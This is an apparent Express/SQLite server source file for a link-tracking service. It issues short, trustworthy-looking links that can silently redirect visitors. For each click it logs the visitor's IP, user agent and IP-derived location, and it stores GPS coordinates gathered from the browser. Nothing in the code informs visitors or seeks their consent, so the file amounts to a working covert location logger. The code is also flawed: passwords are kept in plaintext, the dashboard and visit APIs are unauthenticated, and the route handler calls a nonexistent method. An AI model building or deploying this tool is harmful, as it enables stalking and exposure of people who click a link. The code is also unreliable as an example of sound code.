const express = require('express');
const sqlite3 = require('sqlite3').verbose();
// Tạo short ID thay vì UUID dài
function generateShortId() {
  const chars = 'ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Tạo custom path từ tên link
function createFriendlyPath(name) {
  return name
    .toLowerCase()
    .replace(/[^a-z0-9\s-]/g, '') // Loại bỏ ký tự đặc biệt
    .replace(/\s+/g, '-') // Thay space bằng dấu gạch
    .replace(/-+/g, '-') // Loại bỏ dấu gạch liên tiếp
    .slice(0, 20); // Giới hạn độ dài
}
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Khởi tạo database
const db = new sqlite3.Database('tracking.db');

// Chạy migration
migrateDatabase();

// Tạo bảng nếu chưa tồn tại
db.run(`
  CREATE TABLE IF NOT EXISTS tracking_links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT UNIQUE,
    short_path TEXT UNIQUE,
    name TEXT,
    original_url TEXT,
    custom_domain TEXT,
    preview_enabled BOOLEAN DEFAULT 1,
    password TEXT,
    expires_at DATETIME,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

db.run(`
  CREATE TABLE IF NOT EXISTS visits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT,
    ip_address TEXT,
    user_agent TEXT,
    latitude REAL,
    longitude REAL,
    country TEXT,
    city TEXT,
    region TEXT,
    timezone TEXT,
    visited_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (link_id) REFERENCES tracking_links (link_id)
  )
`);

// Migration function để cập nhật database schema
function migrateDatabase() {
  console.log('🔄 Checking database schema...');
  
  // Kiểm tra xem có cột short_path không
  db.all("PRAGMA table_info(tracking_links)", (err, columns) => {
    if (err) {
      console.error('Error checking table schema:', err);
      return;
    }
    
    const hasShortPath = columns.some(col => col.name === 'short_path');
    const hasCustomDomain = columns.some(col => col.name === 'custom_domain');
    const hasPreviewEnabled = columns.some(col => col.name === 'preview_enabled');
    const hasPassword = columns.some(col => col.name === 'password');
    const hasExpiresAt = columns.some(col => col.name === 'expires_at');
    
    if (!hasShortPath) {
      console.log('➕ Adding short_path column...');
      db.run("ALTER TABLE tracking_links ADD COLUMN short_path TEXT", (err) => {
        if (err) console.error('Error adding short_path:', err);
      });
    }
    
    if (!hasCustomDomain) {
      console.log('➕ Adding custom_domain column...');
      db.run("ALTER TABLE tracking_links ADD COLUMN custom_domain TEXT", (err) => {
        if (err) console.error('Error adding custom_domain:', err);
      });
    }
    
    if (!hasPreviewEnabled) {
      console.log('➕ Adding preview_enabled column...');
      db.run("ALTER TABLE tracking_links ADD COLUMN preview_enabled BOOLEAN DEFAULT 1", (err) => {
        if (err) console.error('Error adding preview_enabled:', err);
      });
    }
    
    if (!hasPassword) {
      console.log('➕ Adding password column...');
      db.run("ALTER TABLE tracking_links ADD COLUMN password TEXT", (err) => {
        if (err) console.error('Error adding password:', err);
      });
    }
    
    if (!hasExpiresAt) {
      console.log('➕ Adding expires_at column...');
      db.run("ALTER TABLE tracking_links ADD COLUMN expires_at DATETIME", (err) => {
        if (err) console.error('Error adding expires_at:', err);
        else {
          // Migrate existing links
          migrateExistingLinks();
        }
      });
    } else {
      migrateExistingLinks();
    }
  });
}

function migrateExistingLinks() {
  console.log('🔄 Migrating existing links...');
  
  // Cập nhật các link cũ để có short_path
  db.all("SELECT * FROM tracking_links WHERE short_path IS NULL", (err, links) => {
    if (err) {
      console.error('Error fetching links for migration:', err);
      return;
    }
    
    links.forEach(link => {
      const shortPath = createFriendlyPath(link.name) + '-' + generateShortId().slice(0, 3);
      
      db.run(
        "UPDATE tracking_links SET short_path = ?, preview_enabled = 1 WHERE id = ?",
        [shortPath, link.id],
        (err) => {
          if (err) {
            console.error(`Error migrating link ${link.id}:`, err);
          } else {
            console.log(`✅ Migrated link: ${link.name} -> /${shortPath}`);
          }
        }
      );
    });
  });
}

// Hàm lấy thông tin IP với fallback
async function getIPInfo(ip) {
  try {
    // Thử ipapi.co trước
    const response = await axios.get(`https://ipapi.co/${ip}/json/`, {
      timeout: 5000
    });
    if (response.data && !response.data.error) {
      return response.data;
    }
  } catch (error) {
    console.log('ipapi.co failed, trying backup service...');
  }
  
  try {
    // Fallback sang ip-api.com (free, không cần key)
    const response = await axios.get(`http://ip-api.com/json/${ip}`, {
      timeout: 5000
    });
    if (response.data && response.data.status === 'success') {
      return {
        latitude: response.data.lat,
        longitude: response.data.lon,
        country_name: response.data.country,
        city: response.data.city,
        region: response.data.regionName,
        timezone: response.data.timezone
      };
    }
  } catch (error) {
    console.log('ip-api.com also failed');
  }
  
  // Nếu tất cả đều fail, trả về dữ liệu mặc định
  return {
    latitude: null,
    longitude: null,
    country_name: 'Unknown',
    city: 'Unknown',
    region: 'Unknown',
    timezone: 'Unknown'
  };
}

// Routes
// Trang chủ - Dashboard
app.get('/', (req, res) => {
  db.all(`
    SELECT tl.*, COUNT(v.id) as visit_count 
    FROM tracking_links tl 
    LEFT JOIN visits v ON tl.link_id = v.link_id 
    GROUP BY tl.id 
    ORDER BY tl.created_at DESC
  `, (err, links) => {
    if (err) {
      console.error(err);
      return res.status(500).send('Database error');
    }
    
    // Tạo tracking URL cho mỗi link
    links.forEach(link => {
      link.tracking_url = `${req.protocol}://${req.get('host')}/${link.short_path}`;
      link.is_expired = link.expires_at && new Date() > new Date(link.expires_at);
    });
    
    res.render('dashboard', { links, req });
  });
});

// API tạo link mới với options nâng cao
app.post('/api/create-link', (req, res) => {
  const { name, originalUrl, customPath, customDomain, enablePreview, password, expiresIn } = req.body;
  const linkId = generateShortId();
  
  // Tạo friendly path
  let shortPath = customPath || createFriendlyPath(name) + '-' + generateShortId().slice(0, 3);
  
  // Xử lý domain
  const domain = customDomain || req.get('host');
  
  // Xử lý expiry
  let expiresAt = null;
  if (expiresIn && expiresIn > 0) {
    expiresAt = new Date(Date.now() + expiresIn * 24 * 60 * 60 * 1000).toISOString();
  }
  
  db.run(
    `INSERT INTO tracking_links 
     (link_id, short_path, name, original_url, custom_domain, preview_enabled, password, expires_at) 
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
    [linkId, shortPath, name, originalUrl, domain, enablePreview ? 1 : 0, password || null, expiresAt],
    function(err) {
      if (err) {
        if (err.message.includes('UNIQUE')) {
          // Thử lại với path khác
          shortPath = createFriendlyPath(name) + '-' + generateShortId();
          db.run(
            `INSERT INTO tracking_links 
             (link_id, short_path, name, original_url, custom_domain, preview_enabled, password, expires_at) 
             VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
            [linkId, shortPath, name, originalUrl, domain, enablePreview ? 1 : 0, password || null, expiresAt],
            function(err2) {
              if (err2) {
                console.error(err2);
                return res.status(500).json({ error: 'Database error' });
              }
              sendResponse();
            }
          );
        } else {
          console.error(err);
          return res.status(500).json({ error: 'Database error' });
        }
      } else {
        sendResponse();
      }
      
      function sendResponse() {
        const trackingUrl = `${req.protocol}://${domain}/${shortPath}`;
        const adminUrl = `${req.protocol}://${req.get('host')}/admin/${linkId}`;
        
        res.json({
          success: true,
          linkId,
          shortPath,
          trackingUrl,
          adminUrl,
          originalUrl,
          expiresAt
        });
      }
    }
  );
});

// Route tracking ngắn gọn và uy tín - /:shortPath
app.get('/:shortPath', async (req, res) => {
  const shortPath = req.params.shortPath;
  
  // Bỏ qua các route system
  if (['api', 'admin', 'track', 'details', 'favicon.ico', 'robots.txt'].includes(shortPath)) {
    return res.next();
  }
  
  // Lấy thông tin link
  db.get('SELECT * FROM tracking_links WHERE short_path = ?', [shortPath], async (err, link) => {
    if (err || !link) {
      return res.status(404).render('404', { shortPath });
    }
    
    // Kiểm tra expired
    if (link.expires_at && new Date() > new Date(link.expires_at)) {
      return res.status(410).render('expired', { link });
    }
    
    // Kiểm tra password
    if (link.password && req.query.pwd !== link.password) {
      return res.render('password', { link, shortPath });
    }
    
    await processTracking(req, res, link);
  });
});

// Route tracking cũ để backward compatibility
app.get('/track/:linkId', async (req, res) => {
  const linkId = req.params.linkId;
  
  db.get('SELECT * FROM tracking_links WHERE link_id = ?', [linkId], async (err, link) => {
    if (err || !link) {
      return res.status(404).send('Link not found');
    }
    
    await processTracking(req, res, link);
  });
});

// Hàm xử lý tracking chung
async function processTracking(req, res, link) {
    // Lấy IP và thông tin người dùng với xử lý tốt hơn
    let clientIP = req.headers['x-forwarded-for'] || 
                   req.headers['x-real-ip'] ||
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress ||
                   (req.connection.socket ? req.connection.socket.remoteAddress : null);
    
    // Xử lý trường hợp có nhiều IP trong x-forwarded-for
    if (clientIP && clientIP.includes(',')) {
      clientIP = clientIP.split(',')[0].trim();
    }
    
    // Loại bỏ IPv6 prefix nếu có
    if (clientIP && clientIP.substr(0, 7) === '::ffff:') {
      clientIP = clientIP.substr(7);
    }
    
    const userAgent = req.headers['user-agent'];
    
    // Debug log
    console.log('=== TRACKING DEBUG ===');
    console.log('Raw IP:', req.connection.remoteAddress);
    console.log('X-Forwarded-For:', req.headers['x-forwarded-for']);
    console.log('X-Real-IP:', req.headers['x-real-ip']);
    console.log('Final Client IP:', clientIP);
    console.log('User Agent:', userAgent);
    console.log('======================');
    
    // Lấy thông tin vị trí từ IP
    let ipInfo;
    if (clientIP === '::1' || clientIP === '127.0.0.1' || clientIP.startsWith('192.168.') || clientIP.startsWith('10.')) {
      console.log('🏠 Local/Private IP detected - Using demo IP for testing');
      // Sử dụng IP demo để test (IP của Google)
      ipInfo = await getIPInfo('8.8.8.8');
      if (ipInfo) {
        ipInfo.isDemo = true;
        ipInfo.realIP = clientIP;
      }
    } else {
      console.log('🌐 Public IP detected - Getting real location');
      ipInfo = await getIPInfo(clientIP);
    }
    
    // Lưu thông tin visit
    const visitData = {
      link_id: link.link_id,
      ip_address: clientIP,
      user_agent: userAgent,
      latitude: ipInfo ? ipInfo.latitude : null,
      longitude: ipInfo ? ipInfo.longitude : null,
      country: ipInfo ? ipInfo.country_name : null,
      city: ipInfo ? ipInfo.city : null,
      region: ipInfo ? ipInfo.region : null,
      timezone: ipInfo ? ipInfo.timezone : null
    };
    
    db.run(`
      INSERT INTO visits (link_id, ip_address, user_agent, latitude, longitude, country, city, region, timezone)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `, Object.values(visitData), (err) => {
      if (err) console.error('Error saving visit:', err);
    });
    
    // Hiển thị trang tracking hoặc redirect trực tiếp
    if (link.preview_enabled) {
      res.render('tracking', {
        link,
        visit: visitData,
        requestLocation: true
      });
    } else {
      // Redirect trực tiếp không hiển thị trang tracking
      res.redirect(link.original_url);
    }
}

// API lấy vị trí từ GPS (JavaScript geolocation)
app.post('/api/update-location', (req, res) => {
  const { linkId, latitude, longitude } = req.body;
  
  // Cập nhật vị trí GPS nếu có
  db.run(`
    UPDATE visits 
    SET latitude = ?, longitude = ? 
    WHERE link_id = ? AND visited_at = (
      SELECT MAX(visited_at) FROM visits WHERE link_id = ?
    )
  `, [latitude, longitude, linkId, linkId], (err) => {
    if (err) {
      console.error('Error updating location:', err);
      return res.status(500).json({ error: 'Database error' });
    }
    res.json({ success: true });
  });
});

// API lấy dữ liệu visits cho một link
app.get('/api/visits/:linkId', (req, res) => {
  const linkId = req.params.linkId;
  
  db.all('SELECT * FROM visits WHERE link_id = ? ORDER BY visited_at DESC', [linkId], (err, visits) => {
    if (err) {
      console.error(err);
      return res.status(500).json({ error: 'Database error' });
    }
    res.json(visits);
  });
});

// Trang xem chi tiết một link
app.get('/details/:linkId', (req, res) => {
  const linkId = req.params.linkId;
  
  db.get('SELECT * FROM tracking_links WHERE link_id = ?', [linkId], (err, link) => {
    if (err || !link) {
      return res.status(404).send('Link not found');
    }
    
    db.all('SELECT * FROM visits WHERE link_id = ? ORDER BY visited_at DESC', [linkId], (err, visits) => {
      if (err) {
        console.error(err);
        return res.status(500).send('Database error');
      }
      
      // Truyền req object vào template
      res.render('details', { link, visits, req });
    });
  });
});

// API để kiểm tra IP hiện tại
app.get('/api/check-ip', async (req, res) => {
  let clientIP = req.headers['x-forwarded-for'] || 
                 req.headers['x-real-ip'] ||
                 req.connection.remoteAddress || 
                 req.socket.remoteAddress ||
                 (req.connection.socket ? req.connection.socket.remoteAddress : null);
  
  if (clientIP && clientIP.includes(',')) {
    clientIP = clientIP.split(',')[0].trim();
  }
  
  if (clientIP && clientIP.substr(0, 7) === '::ffff:') {
    clientIP = clientIP.substr(7);
  }
  
  // Lấy IP công khai thật từ service bên ngoài
  let publicIP = clientIP;
  try {
    const response = await axios.get('https://api.ipify.org?format=json', { timeout: 3000 });
    publicIP = response.data.ip;
  } catch (error) {
    console.log('Could not get public IP:', error.message);
  }
  
  const ipInfo = await getIPInfo(publicIP);
  
  res.json({
    detectedIP: clientIP,
    publicIP: publicIP,
    isLocalhost: clientIP === '::1' || clientIP === '127.0.0.1' || clientIP.startsWith('192.168.') || clientIP.startsWith('10.'),
    locationInfo: ipInfo,
    headers: {
      'x-forwarded-for': req.headers['x-forwarded-for'],
      'x-real-ip': req.headers['x-real-ip'],
      'user-agent': req.headers['user-agent']
    }
  });
});

// API test với IP thật
app.post('/api/test-real-ip', async (req, res) => {
  try {
    const response = await axios.get('https://api.ipify.org?format=json', { timeout: 3000 });
    const realIP = response.data.ip;
    const ipInfo = await getIPInfo(realIP);
    
    res.json({
      success: true,
      realIP: realIP,
      locationInfo: ipInfo
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

migrateDatabase();

app.listen(PORT, () => {
  console.log(`Server đang chạy tại http://localhost:${PORT}`);
});
